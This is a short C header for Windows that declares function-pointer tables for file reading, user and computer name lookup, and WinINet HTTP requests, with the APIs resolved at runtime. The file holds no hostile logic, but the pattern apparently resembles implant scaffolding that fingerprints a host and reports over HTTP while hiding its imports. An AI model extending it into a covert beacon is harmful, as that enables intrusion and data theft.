#include <Windows.h>
#include <wininet.h>


#define DECL(x) decltype(x) * x;

struct MODULES {
	HMODULE K32;
	HMODULE WININET;
	HMODULE NTDLL;
	HMODULE ADVAPI32;
};

struct WINAPIS {
	DECL(ReadFile);
	DECL(GetUserNameA);
	DECL(GetComputerNameExA);
	DECL(GetModuleFileNameA);
};

struct HTTPAPIS {
	DECL(InternetOpenA);
	DECL(InternetConnectA);
	DECL(HttpOpenRequestA);
	DECL(HttpSendRequestA);
	DECL(InternetReadFile);
	DECL(InternetCloseHandle);
	DECL(HttpAddRequestHeadersA)
};


extern WINAPIS * WinApis;
extern HTTPAPIS* HttpApis;
extern MODULES* kModules;

BOOL LoadAPIS();
